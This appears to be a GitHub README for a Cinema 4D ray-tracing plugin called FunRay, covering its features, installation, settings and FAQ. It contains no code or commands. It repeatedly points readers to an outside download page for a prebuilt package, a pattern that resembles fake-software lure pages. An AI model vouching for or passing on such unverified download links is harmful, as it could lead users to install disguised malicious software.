# FunRay v2026 - Cinema 4D renderer plugin 2026

> **FunRay is a Cinema 4D renderer plugin for ray tracing and progressive rendering, with interactive viewport previews and multi-threaded output in the 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Cinema%204D-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leo-hayesvdme3811/funray-cinema4d-renders?style=flat-square)](https://github.com/leo-hayesvdme3811/funray-cinema4d-renders)

---

<p align="center">
  <a href="https://leo-hayesvdme3811.github.io/funray-cinema4d-renders/">
    <img src="https://img.shields.io/badge/Download-FunRay%20Latest-brightgreen?style=for-the-badge" alt="Download FunRay">
  </a>
</p>

> **[Direct Download - FunRay v2026](https://leo-hayesvdme3811.github.io/funray-cinema4d-renders/)**

---

[Download Latest Build](https://leo-hayesvdme3811.github.io/funray-cinema4d-renders/)

---

## Overview

FunRay adds ray tracing capabilities to Cinema 4D through a renderer plugin built around interactive previews and progressive image refinement. It is aimed at artists who want fast feedback while evaluating lighting, materials, and camera changes directly inside Cinema 4D.

The plugin suits iterative scene work where render parameters need to be adjusted often. With VideoPost support, custom material models, and configurable render controls, FunRay integrates into a Cinema 4D workflow without needing an external rendering application.

---

## What it includes

- Ray tracing renderer plugin for Cinema 4D
- Progressive rendering for gradual image refinement
- Interactive RenderView preview for live scene feedback
- Camera and object adjustment during preview workflows
- Multi-threaded rendering to use available CPU resources
- Custom material support for metal, glass, and Lambert shading
- Scene object support for spheres, cubes, and cylinders
- VideoPost integration for Cinema 4D rendering workflows
- Render controls for samples per pixel and maximum depth

---

## Installation

1. Download the latest build from the project download page.
2. Extract the package into your Cinema 4D plugin directory or the folder specified by your build.
3. Restart Cinema 4D so the plugin can be detected.

If you are working from the repository instead of a packaged build, clone it locally and place the plugin files where Cinema 4D expects third-party extensions.

---

## How to use it

Once installed, start Cinema 4D and open a scene that uses objects and materials supported by FunRay.

Typical workflow:

1. Add or edit scene objects such as spheres, cubes, or cylinders.
2. Assign custom materials for metal, glass, or Lambert shading.
3. Open the RenderView to inspect the progressive preview.
4. Adjust camera position or object placement while observing the preview.
5. Tune samples per pixel and max depth for the desired render result.
6. Use VideoPost when rendering through the Cinema 4D pipeline.

---

## Configuration

FunRay render settings are exposed through Cinema 4D panels and plugin controls. The primary options include progressive rendering behavior, samples per pixel, maximum depth, and preview interaction.

If your build stores preferences separately, keep them alongside your Cinema 4D user configuration so they remain available between sessions.

Example settings layout:

    samples_per_pixel: 64
    max_depth: 8
    progressive_rendering: true
    interactive_preview: true

---

## Requirements

- Cinema 4D
- A compatible desktop system for running Cinema 4D plugins
- Sufficient CPU resources for multi-threaded rendering
- Local storage for the plugin files and scene data

---

## FAQ

**How do I get updates?**  
Use the latest build link above to access the current package, and check any release notes included with the download.

**Where do I change render quality?**  
Adjust samples per pixel and maximum depth in the plugin's render settings.

**Why is the preview important?**  
The interactive RenderView lets you review camera and object changes while the scene is still being refined.

**What if the plugin is not visible in Cinema 4D?**  
Make sure the files are placed in the right plugin directory, then restart Cinema 4D after installation.

**Does it work with VideoPost?**  
Yes, VideoPost integration is included as part of the plugin's Cinema 4D rendering workflow.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
